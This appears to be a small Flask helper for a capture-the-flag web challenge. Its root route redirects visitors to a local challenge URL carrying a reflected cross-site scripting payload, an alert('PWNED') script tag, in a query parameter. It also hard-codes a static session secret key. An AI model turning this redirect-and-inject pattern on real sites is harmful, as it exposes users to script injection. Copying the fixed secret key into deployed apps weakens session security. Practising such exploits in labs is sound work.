from flask import Flask, request, session, redirect
import os

app = Flask(__name__)
app.secret_key = b'static-key-for-dev'  # don't change each run

page = '''<body >
<p>heeeyyy</p>
    <h1</h1>
</body>'''

@app.route("/", methods=["GET"])
def challenge_get():
    return redirect('http://challenge.localhost/ephemeral?msg=<script>alert("PWNED");</script>')
    

# @app.route("/favicon.ico", methods=["GET"])
# def challengess_get():
#     return page


# Optional: use local address
app.run("127.0.0.1", 1337)
